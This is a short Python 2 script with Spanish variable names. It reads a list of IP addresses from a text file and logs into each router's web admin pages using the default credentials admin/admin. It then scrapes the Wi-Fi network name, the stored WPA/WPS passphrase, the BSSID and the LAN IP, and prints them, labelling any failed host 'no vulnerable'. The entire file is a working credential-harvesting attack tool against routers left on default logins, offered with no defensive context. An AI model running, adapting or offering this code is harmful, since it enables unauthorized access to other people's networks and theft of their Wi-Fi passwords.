# -*- coding: utf-8 -*-
import requests as rq
import re
from requests.auth import HTTPBasicAuth
from bs4 import BeautifulSoup as bs
import socket
rq = rq.Session()

archivo = 'C:\Users\Usuario\Desktop\salgar.txt'

def send_req(ip):
    try:

        ip1 = "http://%s/wlan_setup.htm"%(ip)
        mac = "http://%s/status_user.htm"%(ip)
        r = rq.get(mac, auth=HTTPBasicAuth("admin","admin"))
        r1 = rq.get(ip1, auth=HTTPBasicAuth("admin","admin"))
        html = bs(r.content, "html.parser")
        html1 = bs(r1.content, "html.parser")
        mac_addres = bssid(html)
        contra = pwd(html1)
        name = ssid(html1)
        impr(name,contra,mac_addres, ip)
    except:
        print "IP: %s no vulnerable"%(ip)

def impr(a,b,c,ip):
    print "IP:%s\tSSID: %s\tPASSWORD: %s\t%s"%(ip,a,b,c)
def bssid(html):
    result = []
    for m in html.find_all("td",{'width':"60%"}):
        result.append(m)

    mac_add = result[2].text
    ip_lan = result[3].text
    return "BSSID: %s \t LAN_IP: %s"%(mac_add, ip_lan)

def pwd(html1):
    h = (html1.find_all("script"))[6].string
    linea = h.split('\n')
    for i in linea:
        if "wps_psk_old" in i:
            pwd = str(i.split("'")[1])
            return pwd

def ssid(html1):
    for nombre in html1.find_all("input", {'name':"wl_ssid0"}):
        name = nombre["value"]
        return str(name)

def read_file(path):
    with open(path) as fh:
       fstring = fh.readlines()

    pattern = r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})'

    for line in fstring:
        ip = re.findall(pattern,line)
        try:
            ip =  str(ip[0])
            send_req(ip)
        except:
            pass
read_file(archivo)
